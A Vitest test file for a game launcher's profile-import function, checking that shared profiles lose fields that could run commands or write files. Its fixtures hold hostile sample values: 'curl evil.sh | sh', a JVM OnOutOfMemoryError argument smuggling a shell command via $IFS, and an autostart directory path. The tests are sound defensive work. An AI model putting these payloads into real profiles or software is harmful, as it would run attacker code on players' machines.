import { describe, it, expect } from 'vitest';
import { readImportedProfile } from '../src/core/profiles/profile-manager';

/**
 * What a profile export is allowed to bring with it.
 *
 * A profile file gets passed around — posted in a Discord channel, attached to
 * a forum reply. Four fields reach a process or the filesystem at the next
 * launch: `preLaunchCommand` goes to a shell, `customJavaPath` chooses the
 * binary `spawn` runs, `javaArgs` is spliced into the JVM's own argument list
 * (`-XX:OnOutOfMemoryError=…` is a command), and `gameDirectory` is `mkdir`'d
 * and used as the working directory. Before this an "here's my profile"
 * attachment ran whatever its author liked, or wrote wherever it liked, on the
 * machine that opened it, with no step at which anyone was asked.
 */

const exported = {
  id: 'b0a1c2d3-0000-0000-0000-000000000000',
  name: 'Ravens',
  minecraftVersion: '1.21.4',
  modLoader: 'fabric',
  allocatedRamMb: 4096,
  createdAt: '2026-01-01T00:00:00.000Z',
  updatedAt: '2026-01-01T00:00:00.000Z',
};

const importOf = (extra: Record<string, unknown> = {}) =>
  readImportedProfile(JSON.stringify({ ...exported, ...extra }));

describe('readImportedProfile', () => {
  it('keeps the fields that describe a profile', () => {
    const { data } = importOf({ serverIp: 'mc.example.net', allocatedRamMb: 8192 });
    expect(data).toMatchObject({
      name: 'Ravens',
      minecraftVersion: '1.21.4',
      modLoader: 'fabric',
      serverIp: 'mc.example.net',
      allocatedRamMb: 8192,
    });
  });

  it('never carries a pre-launch command across', () => {
    const { data, dropped } = importOf({ preLaunchCommand: 'curl evil.sh | sh' });
    expect(data).not.toHaveProperty('preLaunchCommand');
    expect(dropped).toContain('preLaunchCommand');
  });

  it('never carries a custom Java path across', () => {
    const { data, dropped } = importOf({ customJavaPath: '/tmp/not-a-jvm' });
    expect(data).not.toHaveProperty('customJavaPath');
    expect(dropped).toContain('customJavaPath');
  });

  it('never carries JVM arguments across — they are an execution surface', () => {
    // `-XX:OnOutOfMemoryError=` runs a shell command; the token has no space, so
    // splitting on whitespace keeps it whole and the JVM runs it on the next OOM.
    const { data, dropped } = importOf({
      javaArgs: '-XX:OnOutOfMemoryError=touch$IFS/tmp/pwned',
    });
    expect(data).not.toHaveProperty('javaArgs');
    expect(dropped).toContain('javaArgs');
  });

  it('never carries a game directory across', () => {
    const { data, dropped } = importOf({ gameDirectory: '/home/victim/.config/autostart' });
    expect(data).not.toHaveProperty('gameDirectory');
    expect(dropped).toContain('gameDirectory');
  });

  it('reports nothing dropped for an ordinary profile', () => {
    expect(importOf().dropped).toEqual([]);
  });

  it('drops the launcher-assigned fields so an import is a new profile', () => {
    const { data } = importOf({ lastPlayed: '2026-05-01T00:00:00.000Z', totalPlayTimeMinutes: 90 });
    expect(data).not.toHaveProperty('id');
    expect(data).not.toHaveProperty('createdAt');
    expect(data).not.toHaveProperty('lastPlayed');
    expect(data).not.toHaveProperty('totalPlayTimeMinutes');
  });

  it('does not let unknown fields ride along', () => {
    const { data } = importOf({ somethingElse: 'x' });
    expect(data).not.toHaveProperty('somethingElse');
  });

  it('rejects a file that is not a profile', () => {
    expect(() => readImportedProfile('[]')).toThrow(/does not contain a profile/);
    expect(() => readImportedProfile('"hello"')).toThrow(/does not contain a profile/);
    expect(() => readImportedProfile('{"name":"x"}')).toThrow(/not a valid profile/);
  });

  it('accepts an export that predates the id and timestamps being written', () => {
    const { id: _id, createdAt: _c, updatedAt: _u, ...bare } = exported;
    expect(readImportedProfile(JSON.stringify(bare)).data.name).toBe('Ravens');
  });
});
